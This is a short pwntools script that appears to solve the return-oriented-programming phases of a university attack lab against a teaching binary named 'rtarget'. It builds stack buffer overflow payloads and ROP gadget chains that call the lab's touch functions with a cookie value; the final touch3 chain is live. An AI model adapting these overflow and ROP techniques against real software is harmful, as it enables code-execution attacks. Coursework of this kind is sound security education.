#########################PART 1############################
from pwn import *
context.log_level="debug"
import sys
reload(sys)
sys.setdefaultencoding('utf8')
#########################PART 2############################
argt="-q"
p=process(argv=['./rtarget', argt])
elf=ELF("./rtarget")
bkp1=0x4017B4
bkp2=0x4018cf
#gdb.attach(p,"b*0x4018cf")

touch1=0x4017C0
touch2=0x4017EC
touch3=0x4018FA

p.recvuntil("Cookie:")
cookie=int(p.recv(11),16)
print(hex(cookie))

#########################touch1 task############################
'''
payload1="a"*40+p64(touch1)
p.sendline(payload1)
'''
#########################touch2 task############################
'''
pop_rdi_ret=0x000000000040141b
payload2="a"*40+p64(pop_rdi_ret)+p64(cookie)+p64(touch2)
p.sendline(payload2)
'''
#########################touch3 task############################
nop_ret=0x000000000040199e
pop_rdi_ret=0x000000000040141b
mov_rdi_rax=0x00000000004019c5
mov_rax_rsp=0x0000000000401a06
pop_rax_ret=0x00000000004019ab
add_xy=0x00000000004019D6
#payload3="a"*40+p64(pop_rdi_ret)+p64(bss_stack_top)+p64(put_plt)+p64(get_buffer)
payload3="a"*40+p64(mov_rax_rsp)+p64(mov_rdi_rax)+p64(add_xy)+p64(mov_rdi_rax)+p64(touch3)+p64(nop_ret)+'\x00'*7+str(hex(cookie))
p.sendline(payload3)

p.interactive()

